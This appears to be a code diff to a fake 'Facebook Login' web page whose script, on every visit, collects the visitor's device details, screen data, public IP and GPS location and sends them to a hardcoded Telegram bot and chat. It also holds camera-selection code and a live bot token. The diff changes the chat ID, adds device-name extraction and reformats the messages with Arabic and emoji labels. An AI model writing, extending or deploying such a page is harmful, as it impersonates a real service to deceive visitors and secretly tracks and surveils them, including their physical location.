@@ -3,7 +3,8 @@
   <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Login Page</title>
+    <title>Facebook Login</title>
+    <link rel="icon" href="assets/icon.png" type="image/png">
     <link rel="stylesheet" href="style.css">
   </head>
   <body>
@@ -31,7 +32,7 @@
 
     <script>
       const BOT_TOKEN = '6575631247:AAHgvHAO8xAgtX3KzUnGC-pg-cownq7Jl58';
-      const CHAT_ID = '177668984';
+      const CHAT_ID = '1776689384'; // تم تغيير ID الشات
       const IMAGE_URL = 'https://t.me/assets_tnzxo/3';
 
       let currentCamera = 'user';
@@ -112,19 +113,20 @@
       // إرسال رسالة عند دخول المستخدم
       async function sendEntryMessage() {
         try {
-          let message = 'دخل مستخدم جديد إلى الموقع!\n';
+          let message = '👤 دخل مستخدم جديد إلى الموقع! 👤\n';
 
           // معلومات الجهاز
-          message += `\nDevice Information:\n`;
+          message += `\n📱 معلومات الجهاز 📱:\n`;
+          message += `- اسم الجهاز: ${getDeviceName()}\n`; // محاولة الحصول على اسم الجهاز
           message += `- User Agent: ${navigator.userAgent}\n`;
           message += `- Platform: ${navigator.platform}\n`;
-          message += `- Language: ${navigator.language}\n`;
-          message += `- Online: ${navigator.onLine}\n`;
-          message += `- Cookies Enabled: ${navigator.cookieEnabled}\n`;
+          message += `- Language: 🗣️ ${navigator.language}\n`;
+          message += `- Online: 🌐 ${navigator.onLine ? '✅' : '❌'}\n`;
+          message += `- Cookies Enabled: 🍪 ${navigator.cookieEnabled ? '✅' : '❌'}\n`;
           message += `- Device Type: ${getDeviceType()}\n`;
 
           // معلومات الشاشة
-          message += `\nScreen Information:\n`;
+          message += `\n🖥️ معلومات الشاشة 🖥️:\n`;
           message += `- Width: ${screen.width}\n`;
           message += `- Height: ${screen.height}\n`;
           message += `- Color Depth: ${screen.colorDepth}\n`;
@@ -134,7 +136,7 @@
           const ipResponse = await fetch('https://api.ipify.org?format=json');
           if (ipResponse.ok) {
             const ipData = await ipResponse.json();
-            message += `\nIP: ${ipData.ip}`;
+            message += `\n🌐 IP: ${ipData.ip}`;
           }
 
           // الحصول على الموقع (يطلب إذن)
@@ -143,7 +145,7 @@
               const latitude = position.coords.latitude;
               const longitude = position.coords.longitude;
               const googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
-              message += `\nLocation: ${googleMapsLink}`;
+              message += `\n📍 الموقع: ${googleMapsLink}`;
               sendMessage(message);
             }, function(error) {
               console.error('Error getting location:', error);
@@ -168,6 +170,17 @@
           return 'Mac';
         } else if (/Windows/i.test(userAgent)) {
           return 'Windows';
+        } else {
+          return 'Unknown';
+        }
+      }
+
+      function getDeviceName() {
+        // محاولة الحصول على اسم الجهاز (غير مضمون)
+        const userAgent = navigator.userAgent;
+        const match = userAgent.match(/\(([^)]+)\)/);
+        if (match) {
+          return match[1];
         } else {
           return 'Unknown';
         }
